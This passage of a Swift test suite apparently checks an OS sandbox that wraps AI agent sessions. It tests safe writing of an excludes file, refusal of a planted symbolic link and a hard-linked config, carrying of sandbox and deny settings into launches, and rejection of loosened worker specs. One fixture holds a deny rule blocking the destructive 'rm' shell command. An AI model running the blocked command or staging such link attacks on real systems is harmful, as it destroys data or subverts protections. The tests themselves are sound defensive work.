  @Test func theRestartProofUsedListIsWrittenAsPlainAtomicWrites() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    let path = t.home + "/restart-proofs-used.json"
    try t.file("Home/restart-proofs-used.json", String(decoding: DialogProofsUsed.encode(["a"]), as: UTF8.self))
    let r = DialogProofsUsed.record("b", memory: ["a"], path: path, folderIsReal: { true })
    #expect(r.written)
    #expect(DialogProofsUsed.read(path: path) == ["a", "b"])
  }
}

// MARK: one start

@Suite("OS sandbox: one start")
struct OsSandboxStartTests {
  @Test func theExcludesFileIsWrittenForTheSessionAndAPlantedLinkIsNeverWrittenThrough() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    guard case .ready(let p) = t.prepare() else { Issue.record("refused"); return }
    let text = try String(contentsOfFile: t.home + "/sandbox/gitignore", encoding: .utf8)
    #expect(text.hasPrefix(".bashrc\n") && text.hasSuffix(".cache/\n") && p.excludesPath == t.home + "/sandbox/gitignore")
    // a link planted at sandbox/ (made outside): the write goes nowhere else
    try FileManager.default.removeItem(atPath: t.home + "/sandbox")
    try t.file("Else/keep")
    try t.link("Home/sandbox", to: t.root + "/Else")
    let r = t.prepare()
    // the preflight does not walk sandbox/ (the app's own), so the write step is the one that refuses
    #expect(r == .refused("\(t.home)/sandbox is a symbolic link; remove it, then start again"))
    #expect(try FileManager.default.contentsOfDirectory(atPath: t.root + "/Else") == ["keep"])
  }

  @Test func aDryPlanWritesNothing() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    guard case .ready = t.prepare(dry: true) else { Issue.record("refused"); return }
    #expect(!FileManager.default.fileExists(atPath: t.home + "/sandbox"))
  }

  @Test func aWriteThatFailsRefusesTheStartAndSaysWhy() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    struct Disk: Error {}
    let r = OsSandbox.prepare(t.input(), write: { _, _ in throw Disk() }, kitDir: t.kit)
    guard case .refused(let why) = r else { Issue.record("a start whose excludes file cannot be written must not go ahead"); return }
    #expect(why.hasPrefix("the OS sandbox cannot be set up:"), "\(why)")
  }
}

// MARK: Main's settings and a thread's

@Suite("OS sandbox: Main's settings and a thread's")
struct OsSandboxLaunchTests {
  let home = "/home/alex/.talos"

  func pieces() throws -> (SbxTree, OsSandbox.Pieces) {
    let t = try SbxTree()
    try t.protectedHome()
    return (t, try OsSandbox.settings(t.input()))
  }

  @Test func withoutGuardsMainsOneSettingsTextCarriesTheSandboxAndTheEnv() throws {
    let (t, p) = try pieces()
    defer { t.cleanup() }
    let r = GuardsSettings.applyingToMain(
      to: ["--x"], talosHome: home, sandbox: { .ready(p) }, read: { _ in nil }, write: { _, _ in Issue.record("no write") })
    #expect(r.refusal == nil && r.warnings.isEmpty)
    #expect(r.args[0] == "--settings" && Array(r.args.suffix(1)) == ["--x"])
    let s = try #require(SettingsJSON.object(Data(r.args[1].utf8)))
    #expect(OsSandbox.carries(s, p))
    #expect((s["deniedMcpServers"] as? [[String: Any]])?.isEmpty == false, "the computer-use deny is in the same settings")
  }

  @Test func withGuardsThePrivateLaunchFileCarriesItBesideThem() throws {
    let (t, p) = try pieces()
    defer { t.cleanup() }
    var wrote: Data?
    let guards = #"{"permissions":{"deny":["Bash(rm:*)"]}}"#
    let r = GuardsSettings.applyingToMain(
      to: [], talosHome: home, sandbox: { .ready(p) }, read: { $0.hasSuffix("/guards/settings.json") ? Data(guards.utf8) : nil },
      write: { d, _ in wrote = d })
    #expect(r.refusal == nil && r.args == ["--settings", GuardsSettings.mainLaunchPath(talosHome: home)])
    let bytes = try #require(wrote)
    let o = try #require(SettingsJSON.object(bytes))
    #expect(OsSandbox.carries(o, p) && ((o["permissions"] as? [String: Any])?["deny"] as? [String]) == ["Bash(rm:*)"])
  }

  @Test func aRefusedPreflightIsTheLaunchsRefusalAndTheArgsAreUntouched() {
    let line = "config.json has another name on this disk (a hard link); remove the other link, then start again"
    let r = GuardsSettings.applyingToMain(to: ["--x"], talosHome: home, sandbox: { .refused(line) }, read: { _ in nil })
    #expect(r.refusal == line && r.args == ["--x"])
  }

  @Test func theOwnersOwnSettingsStayAndTheLockIsSaidNotToBeOn() {
    let r = GuardsSettings.applyingToMain(
      to: ["--settings", "/home/alex/own.json", "--x"], talosHome: home,
      sandbox: { Issue.record("the sandbox is not built for a launch that cannot carry it"); return .refused("x") }, read: { _ in nil })
    #expect(r.refusal == nil && r.args.contains("/home/alex/own.json"))
    #expect(r.warnings == ["the launch args already include --settings: the extra lock on protected files (OS sandbox) is NOT active"])
  }

  @Test func guardsThatCannotBeReadOrAFileThatCannotBeWrittenStopMainRatherThanStartItWithoutTheLock() throws {
    let (t, p) = try pieces()
    defer { t.cleanup() }
    let unreadable = GuardsSettings.applyingToMain(to: [], talosHome: home, sandbox: { .ready(p) }, read: { _ in Data("not json".utf8) })
    #expect(unreadable.refusal?.hasSuffix("and the extra lock on protected files (OS sandbox) is NOT active, so Main is not started") == true)
    #expect(unreadable.args.isEmpty)
    struct Disk: Error {}
    let unwritable = GuardsSettings.applyingToMain(
      to: [], talosHome: home, sandbox: { .ready(p) }, read: { _ in Data("{}".utf8) }, write: { _, _ in throw Disk() })
    #expect(unwritable.refusal?.hasSuffix("so Main is not started") == true && unwritable.args.isEmpty)
    // the same two with the switch off keep today's behaviour: the guards' file goes in and a warning says what is off
    let off = GuardsSettings.applyingToMain(to: [], talosHome: home, read: { _ in Data("not json".utf8) })
    #expect(off.refusal == nil && off.warnings.count == 1)
  }

  @Test func aThreadSessionsSettingsCarryItAndASpecWithoutItIsRefused() throws {
    let f = try FenceTree()
    defer { f.cleanup() }
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    let p = try OsSandbox.settings(.init(talosHome: t.home, userHome: f.home, folder: f.cwd, claudeDir: f.claudeDir))
    var i = fenceInputs(f)
    i.osSandbox = p
    let spec = try WorkerSpec.build(i)
    let settings = try #require(jsonObject(spec.settingsJSON))
    #expect(OsSandbox.carries(settings, p))
    #expect(((settings["sandbox"] as? [String: Any])?["allowUnsandboxedCommands"] as? Bool) == false)
    // the supervisor's own read says the switch is on: a spec that came from the switch being off is refused
    let off = try WorkerSpec.build(fenceInputs(f))
    #expect(throws: WorkerSpec.BuildError.sandboxMissing) { try off.validate(osSandbox: p) }
    // and one whose block was loosened is refused
    var loose = settings
    var sb = try #require(settings["sandbox"] as? [String: Any])
    sb["failIfUnavailable"] = false
    loose["sandbox"] = sb
    var tampered = spec
    tampered.settingsJSON = sbxJSON(loose)
    #expect(throws: WorkerSpec.BuildError.sandboxMissing) { try tampered.validate(osSandbox: p) }
    // the switch off: no sandbox key at all
    #expect(jsonObject(off.settingsJSON)?["sandbox"] == nil)
    try spec.validate(osSandbox: p)
  }
}
